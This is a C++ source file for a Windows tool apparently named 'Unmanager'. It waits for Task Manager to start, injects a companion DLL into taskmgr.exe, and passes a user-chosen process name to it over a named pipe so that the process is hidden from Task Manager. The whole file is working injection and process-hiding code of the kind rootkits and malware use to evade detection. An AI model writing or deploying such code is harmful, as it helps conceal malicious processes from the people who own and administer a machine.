#include "Unmanager.h"
#include "Console.h"
#include <Windows.h>
#include <winternl.h>

#define DLL_NAME "\\UnmanagerDLL.dll"

int main()
{
	Console con;
	Unmanager manager;
	HANDLE taskMgrHandle;
	HANDLE dllFileHandle;
	HANDLE pipe;
	int pid = -1;
	int lastError = 0;
	char hiddenName[MAX_PATH];
	char buffer[MAX_PATH];
	char* fullDllPath;
	int fullDllPathLength;
	int foundDll = 1;

	fullDllPathLength = GetCurrentDirectoryA(0, NULL);

	fullDllPath = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fullDllPathLength + lstrlenA(DLL_NAME));

	if (!GetCurrentDirectoryA(fullDllPathLength, fullDllPath))
	{
		foundDll = 0;
	}

	if (!WriteProcessMemory(GetCurrentProcess(), fullDllPath + fullDllPathLength - 1, DLL_NAME, lstrlenA(DLL_NAME), NULL))
	{
		foundDll = 0;
	}
 
	dllFileHandle = CreateFileA(fullDllPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (dllFileHandle == INVALID_HANDLE_VALUE)
	{
		foundDll = 0;
	}

	if (!foundDll)
	{
		con.Write("Failed to find needed dll '");
		con.Write(DLL_NAME);
		con.WriteLine("'");

		con.WriteLine("Exiting program...");
		return 1;
	}

	CloseHandle(dllFileHandle);

	con.Write("Please enter the full process name to hide (ex 'calc.exe'): ");

	con.ReadLine(buffer, MAX_PATH);

	if (!WriteProcessMemory(GetCurrentProcess(), hiddenName, buffer, lstrlenA(buffer), NULL))
	{
		int lastError = 0;
		lastError = GetLastError();

		con.WriteLine("Failed to create process name buffer...");
		con.WriteLine("Exiting program...");
		return 1;
	}

	int shouldPrintSearchMessage = 1;

	while (1)
	{
		if (shouldPrintSearchMessage)
		{
			shouldPrintSearchMessage = 0;
			con.WriteLine("Searching for taskmgr.exe...");
		}

		Sleep(10);

		pid = manager.GetPidFromProcessName(L"taskmgr.exe");
		
		if (pid != -1)
		{
			shouldPrintSearchMessage = 1;
			con.WriteLine("Found taskmgr.exe...");


			taskMgrHandle = OpenProcess(PROCESS_QUERY_INFORMATION | SYNCHRONIZE, false, pid);

			if (taskMgrHandle)
			{
				con.WriteLine("Got valid process handle for taskmgr.exe...");
				con.WriteLine("Attempting to inject dll into taskmgr.exe...");

				pipe = CreateNamedPipeW(L"\\\\.\\pipe\\UnmanagerPipe", PIPE_ACCESS_OUTBOUND, PIPE_TYPE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, MAX_PATH, MAX_PATH, 0, NULL);

				if (pipe == INVALID_HANDLE_VALUE)
				{
					con.WriteLine("Could not create pipe to communicate with injected dll...");
					con.WriteLine("Exiting program...");
					return 1;
				}

				if (manager.InjectDLL(pid, fullDllPath))
				{
					con.WriteLine("Successfully injected dll...");

					DWORD bytesWritten;

					while (!WriteFile(pipe, hiddenName, MAX_PATH, &bytesWritten, NULL))
					{
						Sleep(10);
					}

					con.WriteLine("Waiting for taskmgr.exe to close...");

					WaitForSingleObject(taskMgrHandle, INFINITE); 

					con.WriteLine("taskmgr.exe closed...");

					DisconnectNamedPipe(pipe);
					CloseHandle(pipe);
				}
				else
				{
					con.WriteLine("Failed to inject dll into taskmgr.exe...are you running the correct architecture version? (e.i x86 on x86 and x64 on x64)");
				}

			}
			else
			{
				con.WriteLine("Failed to open handle to taskmgr.exe...are you running as Administrator?");
			}

			CloseHandle(taskMgrHandle);
		}
	}

	return 0;
}